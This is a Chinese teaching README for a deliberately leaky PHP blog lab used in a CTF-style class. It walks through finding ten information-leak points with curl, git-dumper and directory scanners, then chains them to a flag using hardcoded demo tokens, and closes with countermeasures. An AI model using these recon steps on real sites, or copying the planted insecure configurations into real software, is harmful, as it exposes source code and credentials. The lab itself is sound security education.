# 示例站：星记博客（信息泄露总示范）

> 对应 PPT 第 31 页「信息泄露：先捡最容易的」。
> 这不是一道单点题，而是**把那一页卡片上的泄露点全摆在一个站里**，让学生照着清单一条条找。

站点本体是一份真实的二次元个人博客构建产物（原博客的 `dist/`），在此基础上**故意**加了一批
运维会犯的错。视觉和交互都是原博客的，只有新增的脚本和泄露点是后加的。

![站点预览](preview.jpg)

- **考点**：信息泄露（`robots.txt` / `.git` / 备份文件 / `.DS_Store` / `phpinfo` / 响应头 / HTML 注释 / 报错页）
- **难度**：1（都是「找到就能用」）
- **Flag 格式**：`flag{...}`
- **端口**：8090

---

## 一、启动环境

> ⚠️ **Windows PowerShell 5.1 用户注意**：`curl` 在那里是 `Invoke-WebRequest` 的别名，
> 敲 `curl -H "A: B"` 会报「无法绑定参数 Headers」。请改用 **`curl.exe`**（Windows 10 1803+ 自带）。
> 完整命令对照表见总 README 的「**在 Windows 上怎么敲这些命令**」一节。

```bash
cd infoleak-demo
docker compose up -d --build
# 浏览器打开 http://127.0.0.1:8090/
```

只有一个 `web` 服务（`php:7.4-apache`）。镜像里做了三件「方便演示」的事：

| 设置 | 为什么 |
|---|---|
| `display_errors=On` | 让「报错页面泄露绝对路径」这条真的能演示 |
| `Header always add X-Debug-Path /var/www/html` | 演示「响应头泄露」 |
| `/backup/` 打开 `Options +Indexes` | 演示「目录扫描扫到备份目录」 |

`dotgit/` 里是一个**真实的 git 仓库**，构建时被 COPY 成网站根目录下的 `.git/` ，
所以 `.git` 泄露是真的可以 `git-dumper` 拉下来的，不是摆样子。

---

## 二、泄露点清单（照 PPT 第 31 页一条条对）

| # | PPT 上写的 | 本站位置 | 你会看到 |
|---|---|---|---|
| 1 | `/robots.txt` | `/robots.txt` | `Disallow: /admin_9k2x/`、`/backup/` |
| 2 | `/.git/` | `/.git/HEAD`、`/.git/logs/HEAD`、`/.git/config` | 真实 git 仓库；日志里能读到 commit 信息 |
| 3 | `/index.php.bak` | `/stats.php.bak` | 备份源码，注释里写着调试口令 |
| 4 | `/www.zip` | `/backup/www.zip` | 站点打包备份，`config/config.php` 里有口令 |
| 5 | `/.DS_Store` | `/.DS_Store` | macOS 留下的目录结构，`strings` 能看到隐藏文件名 |
| 6 | `/phpinfo.php` | `/phpinfo.php` | 环境、路径、扩展一览 |
| 7 | `X-Powered-By` / `Server` | 任意响应头 | `PHP/7.4.x`、`Apache`；额外还有 `X-Debug-Path` |
| 8 | HTML 注释 | 首页「查看源代码」 | `<!-- TODO ... /backup/www.zip ... /admin_9k2x ... -->` |
| 9 | 报错页面 | `/stats.php?id=NOPE` | `Warning: file_get_contents(/var/www/html/data/...)` |
| 10 | 目录扫描 | `dirsearch` / `feroxbuster` | 能扫出 `admin_9k2x/`、`backup/`、`stats.php.bak`、`.DS_Store` 等 |

---

## 三、逐条复现（每个泄露点的精确命令 + 预期输出）

> 下面命令都可直接复制，`8090` 换成你的映射端口即可。课堂上建议**一条条当场跑**。

### 1. robots.txt

```bash
curl -s http://127.0.0.1:8090/robots.txt
```

预期输出（节选）：

```
User-agent: *
Allow: /
Disallow: /config
Disallow: /write
...
Disallow: /admin_9k2x/
Disallow: /backup/
```

**讲解点**：前几行是博客主题自带的（`/config`、`/login`、`/write` 是它的编辑页），
最后两行是「站长加的」—— 而这两行就是导航上没有的东西。

### 2. HTML 注释

```bash
curl -s http://127.0.0.1:8090/ | grep -o '<!-- TODO[^>]*-->'
```

预期输出：

```
<!-- TODO(站长) 2026-09-30：上线前把 /backup/www.zip 和 stats.php.bak 删掉，还有那个 /admin_9k2x 后台。又忘了。 -->
```

浏览器里就是 `Ctrl+U` 拉到最底下 —— **前端注释是最容易漏的泄露点**，因为它在页面上完全不可见。

### 3. 响应头

```bash
curl -sI http://127.0.0.1:8090/
curl -sI http://127.0.0.1:8090/stats.php
```

预期输出（节选）：

```
Server: Apache/2.4.x (Debian)
X-Debug-Path: /var/www/html
```

`/stats.php`（PHP 页面）还会多一行 `X-Powered-By: PHP/7.4.x` —— **静态页面不会有这行**，
所以课上可以让学生观察「哪个页面才有」，顺便讲清 PHP 与静态资源的区别。

### 4. phpinfo.php

```bash
curl -s http://127.0.0.1:8090/phpinfo.php | grep -iE 'DOCUMENT_ROOT|System|PHP Version' | head -5
```

预期输出：

```
<tr><td class="e">System </td><td class="v">Linux ... </td></tr>
<tr><td class="e">PHP Version </td><td class="v">7.4.x</td></tr>
<tr><td class="e">DOCUMENT_ROOT </td><td class="v">/var/www/html</td></tr>
```

**讲解点**：`DOCUMENT_ROOT`、扩展列表、环境变量 —— 一次全暴露。
真实环境里 `phpinfo` 常出现在两个地方：忘记删的 `phpinfo.php`，和 `/info.php`、`/test.php`。

### 5. 报错页面（这一条最值得现场演示）

```bash
curl -s "http://127.0.0.1:8090/stats.php?id=NOPE"
```

预期输出（节选）：

```
<br /><b>Warning</b>:  file_get_contents(/var/www/html/data/visit-NOPE.json):
failed to open stream: No such file or directory in
<b>/var/www/html/stats.php</b> on line <b>10</b><br />
```

一行命令就吐出了 **绝对路径 + 文件名 + 行号**。

**讲解点**：让学生把 `id` 改成任意不存在的值 —— 绝对路径就出来了。
真实渗透报告的第一条往往就是这么来的（「目标使用 `/var/www/html` 作为站点根目录」）。

### 6. 备份源码 `stats.php.bak`

```bash
curl -s http://127.0.0.1:8090/stats.php.bak
```

预期输出（节选）：

```php
// 运维临时调试口令（secret_debug.php / admin_9k2x 都用它）
// $DEBUG_TOKEN = 'sk-9f2c1a7b';
// 用法： /secret_debug.php?token=sk-9f2c1a7b
```

**讲解点**：`.bak` 不会被 PHP 执行，是**原文下载** —— 等于直接把源码给了对手。
常见后缀：`.bak` `.old` `.swp` `~` `.save` `.orig` `.txt`。

### 7. 打包备份 `/backup/`

```bash
curl -s http://127.0.0.1:8090/backup/          # 目录列表
curl -sO http://127.0.0.1:8090/backup/www.zip  # 下载
unzip -o www.zip -d wwwz && cat wwwz/config/config.php
```

预期输出（节选）：

```php
$DB_PASS    = 'Note@2026';
$DEBUG_TOKEN = 'sk-9f2c1a7b';
```

**讲解点**：目录能列表（`Options +Indexes`）本身就是个经典配置失误；
`www.zip` 里往往还带着数据库口令、部署说明、`.env`。

### 8. `.DS_Store`

```bash
curl -sO http://127.0.0.1:8090/.DS_Store
strings -e l .DS_Store | head -20        # Linux / macOS / Git Bash
```

Windows 没有 `strings` 时，用 Python：

```python
data = open(".DS_Store", "rb").read()
for name in data.decode("utf-16-be", "ignore").split("\x00"):
    if name.strip() and name.isprintable():
        print(name)
```

预期能看到：

```
admin_9k2x
backup
secret_debug.php
stats.php.bak
```

**讲解点**：`.DS_Store` 是 macOS 打包时留下的目录索引，中文乱码也别管，**文件名就是情报**。
它就是「目录扫描的免费替代品」。

### 9. `.git` 泄露

**最快的一条 —— 直接读日志：**

```bash
curl -s http://127.0.0.1:8090/.git/logs/HEAD
```

预期输出：

```
0000000... 11b90c6 nfysx <nfysx@example.com> ... commit (initial): init: 统计脚本和后台先传上去
11b90c6... 3e2ccf4 nfysx <nfysx@example.com> ... commit: feat: 访问统计支持按页面查（?id=）
3e2ccf4... d1a819a nfysx <nfysx@example.com> ... commit: chore: 调试口令先写在 stats.php.bak 里，上线前记得删
```

**最后一行就是答案** —— commit message 直接说了口令在哪。

**完整还原（可选，进阶）：**

```bash
pip install git-dumper
git-dumper http://127.0.0.1:8090/.git ./dump
cd dump && git log --oneline && git show HEAD
```

**讲解点**：`.git` 目录泄露 = 源码全丢。三个常见入口：
`.git/HEAD`、`.git/config`（能看到远端地址）、`.git/logs/HEAD`（明文记录每次提交）。
很多人在真实刷分里只会 `curl /.git/config`，却**忘了 logs 是明文的**。

### 10. 目录扫描

```bash
python dirsearch.py -u http://127.0.0.1:8090 -e php,bak,zip,txt,old
# 或
feroxbuster -u http://127.0.0.1:8090 -w /usr/share/wordlists/dirb/common.txt
```

预期能扫出：

```
/admin_9k2x/        (301/200)
/backup/            (200, 目录列表)
/stats.php          (200)
/stats.php.bak      (200)
/phpinfo.php        (200)
/robots.txt         (200)
```

**讲解点**：扫描器只能找到「字典里有的」；`robots.txt` 和 HTML 注释能找到「字典里没有的」。
两者互补 —— 所以**先手翻、再机扫**。

---

## 四、拿 Flag 的三条通路（任选一条）

### 通路 A：robots → 后台 → 备份里的口令

```bash
curl.exe -s http://127.0.0.1:8090/robots.txt | grep admin            # 发现后台
curl.exe -s http://127.0.0.1:8090/admin_9k2x/ | grep -o '口令没有写在页面上.*'
curl.exe -s http://127.0.0.1:8090/stats.php.bak | grep DEBUG_TOKEN   # 偷口令
curl.exe -s "http://127.0.0.1:8090/admin_9k2x/?token=sk-9f2c1a7b" | grep -o 'flag{[^}]*}'
```

### 通路 B：HTML 注释 → 打包备份 → 调试入口

```bash
curl.exe -s http://127.0.0.1:8090/ | grep -o '/backup/www.zip'
curl.exe -sO http://127.0.0.1:8090/backup/www.zip && unzip -o www.zip -d wwwz
curl.exe grep DEBUG_TOKEN wwwz/config/config.php
curl.exe -s "http://127.0.0.1:8090/secret_debug.php?token=sk-9f2c1a7b" | grep -o 'flag{[^}]*}'
```

### 通路 C：`.git` 泄露

```bash
curl.exe -s http://127.0.0.1:8090/.git/logs/HEAD                     # 日志里读到「口令在 stats.php.bak」
curl.exe -s http://127.0.0.1:8090/stats.php.bak | grep DEBUG_TOKEN
curl.exe -s "http://127.0.0.1:8090/secret_debug.php?token=sk-9f2c1a7b" | grep -o 'flag{[^}]*}'
```

> 三条通路用的是同一个口令，都指向 `secret_debug.php` 或 `admin_9k2x`。
> 课上可以分三组各走一条，最后对比「哪条最快」。

---

## 五、课堂用法建议

**别直接给答案，当清单用。** 打开首页，让学生分组找：

1. 先问「你会先看哪儿？」—— 大概率没人说 robots.txt，正好引出第 1 条
2. 每找到一条，就在 PPT 第 31 页上打勾，**找齐 10 条**再讲怎么串成攻击链
3. 第 5 条（报错页）一定要现场演示：把 `id` 改成任意不存在的值，绝对路径就出来了
4. `.DS_Store` 那条特别适合讲「为什么压缩包不要直接放网站根目录」
5. `.git` 那条分两层讲：**入门**只读 `logs/HEAD`；**进阶**上 `git-dumper` 还原源码
6. 收尾：把这 10 条对应到「上线检查清单」—— 每条一个反制措施（见下表）

| 泄露点 | 反制措施 |
|---|---|
| robots.txt | 敏感路径不写进去，靠权限保护 |
| HTML 注释 | 构建时剥离注释；代码 review 检查 |
| 响应头 | 生产环境关 `expose_php`，自定义头别放路径 |
| phpinfo | 上线前删除，或加 IP 白名单 |
| 报错页 | `display_errors=Off`，错误写日志 |
| `.bak` / `.zip` | CI 构建产物部署，`.dockerignore` / `rsync --exclude` |
| `.DS_Store` | 压缩前删掉（`zip -x "*.DS_Store"`） |
| 目录列表 | `Options -Indexes` |
| `.git` | 发布产物不含 `.git`；服务器禁止访问 `.git` |
| 弱口令 | 口令走环境变量 + 随机化 |

---

## 六、动态 Flag

`src/flag.inc.php` 与其他题一致：优先读环境变量 `FLAG`，未注入时首次请求生成随机 flag
并缓存到容器 `/tmp/.web_ctf_flag`。

```bash
FLAG=flag{your-dynamic-flag} docker compose up -d
```

验证方式：

```bash
# 1. 空口令不给 flag
curl -s http://127.0.0.1:8090/secret_debug.php | grep -c 'flag{'      # 应为 0
# 2. 正确口令给 flag
curl -s "http://127.0.0.1:8090/secret_debug.php?token=sk-9f2c1a7b" | grep -o 'flag{[^}]*}'
# 3. 与容器内文件一致
docker exec infoleak-demo-web-1 cat /tmp/.web_ctf_flag
```

---

## 七、说明

- 站点图片、文章、头像都是**原博客自己的素材**，仅用于内部教学演示
- 新增的脚本（`stats.php`、`secret_debug.php`、`admin_9k2x/`、`phpinfo.php`）都是故意写得不安全的，
  **不要拿这段代码当模板**
- `.git` 是演示用的独立仓库，与本仓库无关；提交者署名 `nfysx`
- 口令 `sk-9f2c1a7b` 是固定的（不含 flag），好让题解能写死；flag 本身是动态的
